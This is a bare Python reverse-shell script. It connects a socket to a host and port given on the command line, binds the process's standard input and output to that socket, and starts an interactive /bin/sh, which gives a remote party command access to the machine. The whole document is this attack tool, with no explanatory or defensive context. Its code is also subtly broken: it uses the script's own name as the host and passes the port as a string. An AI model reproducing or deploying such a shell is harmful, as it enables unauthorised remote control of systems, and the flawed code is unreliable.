#!/usr/bin/python3

import socket,subprocess,os,sys;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((sys.argv[0],sys.argv[1]));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);